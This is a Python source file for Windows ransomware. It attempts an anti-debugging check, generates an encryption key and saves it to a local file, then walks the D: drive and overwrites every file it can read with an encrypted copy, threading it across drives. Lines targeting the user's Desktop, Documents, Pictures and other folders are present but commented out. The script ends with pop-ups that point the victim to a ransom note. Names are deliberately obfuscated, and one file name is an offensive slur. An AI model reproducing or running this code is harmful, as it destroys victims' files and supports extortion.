import sys
import os
from cryptography.fernet import Fernet
import ctypes
import win32gui, win32con
import threading

try:
    if ctypes.windll.kernel32.IsDebuggerPresent == 1:
        sys.exit(1)
    KKK = Fernet.generate_key()
    try:
        FOPOPOPOPOP14 = open("cacat_mare.nig", "wb")
        FOPOPOPOPOP14.write(KKK)
        FOPOPOPOPOP14.close()
    except Exception as e:
        print(e)

    def chart_Viewr(hHandle):
        try:
            try:
                try:
                    for R, d, fd in os.walk(hHandle):
                        for f in fd:
                            try:
                                FOP = os.path.join(R, f)

                                FTO = open(FOP, "rb")
                                DDF32432 = FTO.read()
                                FTO.close()

                                CT = Fernet(KKK).encrypt(DDF32432)

                                sFILE = open(FOP, "wb")
                                sFILE.write(CT)
                                sFILE.close()
                            except PermissionError:
                                pass
                except Exception as e:
                    print(e)
            except MemoryError:
                pass
        except MemoryError:
            pass
    def yeyfwfgdufweugfusfuygsj____() -> int:
        # T1971931 = threading.Thread(target = chart_Viewr, args=(f"C:\\Users\\{os.getlogin()}\\Desktop",))
        # T1971931.start()
        # T19719312 = threading.Thread(target = chart_Viewr, args=(f"C:\\Users\\{os.getlogin()}\\Pictures",))
        # T19719312.start()
        # T19719313 = threading.Thread(target = chart_Viewr, args=(f"C:\\Users\\{os.getlogin()}\\Videos",))
        # T19719313.start()
        # T19719314 = threading.Thread(target = chart_Viewr, args=(f"C:\\Users\\{os.getlogin()}\\Documents",))
        # T19719314.start()
        # T19719315 = threading.Thread(target = chart_Viewr, args=(f"C:\\Users\\{os.getlogin()}\\Downloads",))
        # T19719315.start()
        T1971931d = threading.Thread(target = chart_Viewr, args=(f"D:\\",))
        T1971931d.start()
        # T1971931h = threading.Thread(target = chart_Viewr, args=(f"H:\\",))
        # T1971931h.start()
        # T1971931e = threading.Thread(target = chart_Viewr, args=(f"E:\\",))
        # T1971931e.start()
        # T1971931f = threading.Thread(target = chart_Viewr, args=(f"F:\\",))
        # T1971931f.start()
        win32gui.MessageBox(0, "Look On Your Desktop :)\nSearch for a file named: nOtE.txt", "Attention required!", win32con.MB_ICONWARNING)
        win32gui.MessageBox(0, "Look On Your Desktop :)\nSearch for a file named: nOtE.txt", "Attention required!", win32con.MB_ICONWARNING)
        win32gui.MessageBox(0, "Look On Your Desktop :)\nSearch for a file named: nOtE.txt", "Attention required!", win32con.MB_ICONWARNING)
        return 1
    yeyfwfgdufweugfusfuygsj____()
except Exception as e:
    print(e)
